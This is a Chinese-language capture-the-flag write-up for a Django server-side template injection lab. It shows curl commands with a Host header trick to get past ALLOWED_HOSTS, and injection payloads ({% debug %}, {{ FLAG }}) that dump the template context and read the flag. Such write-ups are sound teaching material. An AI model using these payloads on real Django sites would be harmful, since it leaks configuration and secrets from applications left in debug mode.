## 题解

### 入口与指纹

`WSGIServer/0.2 CPython/3.9.25`，页面标题 **`SSTI Demo`**（题目性质写在标题里）。
单入口表单：

```html
<form action="/greet/" method="get">
  <input type="text" id="name" name="name">
</form>
```

**第一个坑：直接用 IP 访问会 400。**

```text
GET http://10.0.173.136:8000/  ->  400 DisallowedHost
```

Django 的 `ALLOWED_HOSTS` 不含 IP。加上 `Host: localhost` 即可正常访问。
（同一份报错页也顺带暴露了 **`DEBUG = True`**。）

### 关键观察

**1. 输入被当模板渲染，不是当字符串拼接。**

| 输入 | 响应 |
| --- | --- |
| `world` | `Hello, world` |
| `{{7*7}}` | `TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'` |
| `${7*7}` | `Hello, ${7*7}`（原样输出） |

`{{ }}` 被 Django 模板引擎解析了——`TemplateSyntaxError` 是**解析期**报错，
证明它走了 `Template(...).render()` 而不是 `render_template(..., name=...)`。

注意：Django 模板**不支持 `*` 运算符**，所以 `{{7*7}}` 这类"算术验证"会报错，
不能拿它和 Jinja2 的 `{{7*7}}=49` 混为一谈。这是区分 Django/Jinja2 的一个有用判据。

**2. `{% debug %}` 直接把整个上下文 dump 出来。**

Django 内置 `debug` 标签在 `DEBUG=True` 时打印上下文与模块列表：

```bash
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={% debug %}' \
  "http://$T/greet/"
```

响应从 100 字节涨到 **96 KB**，里面就有：

```text
Hello, {'FLAG': 'flag{f8740379-04c8-429f-9e93-178084d45b27}'}{}{'DEFAULT_MESSAGE_LEVELS': ...}
```

flag 就在上下文变量 `FLAG` 里。

**3. 知道变量名之后，一行就能取。**

```bash
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={{ FLAG }}' \
  "http://$T/greet/"
# Hello, flag{f8740379-04c8-429f-9e93-178084d45b27}
```

### 利用链

```bash
T=10.0.173.136:8000        # 注意：必须带 Host: localhost

# 1. 确认 SSTI（Django 模板不支持 *，所以看的是解析报错而不是 49）
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={{7*7}}' "http://$T/greet/"

# 2. dump 上下文
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={% debug %}' "http://$T/greet/" \
| grep -o 'flag{[^}]*}'

# 3. 直接读变量
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={{ FLAG }}' "http://$T/greet/"
```

### flag 位置

模板上下文里的 `FLAG` 变量（`{{ FLAG }}` 可直接渲染），
也可通过 `{% debug %}` 的上下文 dump 看到。

## 复盘

- **`DisallowedHost` 不是"打不通"，是"Host 头不对"。** Django 的 `ALLOWED_HOSTS` 校验发生在
  路由之前，所以用 IP 直连一律 400。加 `Host: localhost` 即通；
  这类站点的报错页同时会泄露 `ALLOWED_HOSTS` 与 `DEBUG` 的值。
- **Django 模板不支持算术，别用 `{{7*7}}` 当验证。** Jinja2 返回 `49`，
  Django 抛 `TemplateSyntaxError: Could not parse the remainder`。
  两者都是"SSTI 成立"的证据，但**判断引擎**要看这个差异。
- **`{% debug %}` 是 Django SSTI 的第一发子弹。** 在 `DEBUG=True` 下它 dump 整个上下文，
  往往直接给出 flag 或关键变量名；成本 1 个请求，远优于构造 `__class__.__mro__` 链
  （Django 模板本身也不支持属性链调用，绕起来更麻烦）。
- **标签对比变量更容易猜。** `{% debug %}` 是内置标签，不依赖变量名；
  而 `{{ FLAG }}` 需要先知道变量名。所以顺序应该是：先 `{% debug %}`，再取具体变量。
